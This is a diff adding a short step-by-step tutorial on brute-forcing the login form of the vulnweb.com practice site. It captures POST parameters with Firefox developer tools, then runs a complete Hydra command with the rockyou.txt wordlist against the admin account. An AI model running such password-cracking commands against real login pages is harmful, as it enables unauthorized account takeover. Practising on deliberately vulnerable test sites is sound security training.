@@ -1,0 +1,12 @@
+Step 1 :- Turn ON the developer option in firefox and then network option.
+Step 2:- http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F type this in search bar and hit enter.
+Step 3:- You will notice some text appear on the network developer tab. It tells you what files are transfered to us.
+	 See the method all are GET, since we have not POST any data yet. 
+Step 4:- To obtain the post-form parameters, type whatever in the username and or password form. You will notice a new POST method on the network developer tab. Double click on that line, on the “Headers” tab click “Edit and Resend” button on right-side. 
+	On the Request Body copy the last line, such as “tfUName=asu&tfUPass=raimu”. the “tfUName” and “tfUPass” are parameters we need. 
+Step 5:- Kali linux has bunch of wordlists, choose the appropriate wordlist or just use rockyou.txt place in /usr/share/wordlists/ as seen below:
+
+		hydra -l <username> -P <password list> <Target hostname> <service module> <post request parameters>[/code]
+
+Step 6:- hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
+	Type this command in terminal to crack the password...
